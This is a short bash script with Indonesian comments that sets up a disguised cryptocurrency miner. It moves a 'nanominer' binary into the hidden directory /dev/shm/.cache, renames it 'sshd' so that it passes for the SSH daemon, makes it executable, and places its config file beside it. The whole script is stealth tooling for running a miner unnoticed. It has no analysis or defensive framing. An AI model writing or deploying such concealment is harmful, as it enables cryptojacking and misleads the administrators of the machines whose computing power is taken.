#!/bin/bash

# Nama proses penyamaran
PROC_NAME="sshd"

# Folder tersembunyi
MINER_DIR="/dev/shm/.cache"
MINER_BIN="$MINER_DIR/$PROC_NAME"
CONFIG_FILE="$MINER_DIR/config.ini"

# Pastikan direktori ada
mkdir -p "$MINER_DIR"

# Pindahkan file miner jika belum ada
if [ ! -f "$MINER_BIN" ]; then
    mv nanominer "$MINER_BIN"
    chmod +x "$MINER_BIN"
    echo "Miner berhasil dipindahkan ke $MINER_BIN"
else
    echo "Miner sudah ada di $MINER_BIN"
fi

# Pindahkan config jika belum ada
if [ ! -f "$CONFIG_FILE" ]; then
    mv config.ini "$CONFIG_FILE"
    echo "Config berhasil dipindahkan ke $CONFIG_FILE"
else
    echo "Config sudah ada di $CONFIG_FILE"
fi

exit 0
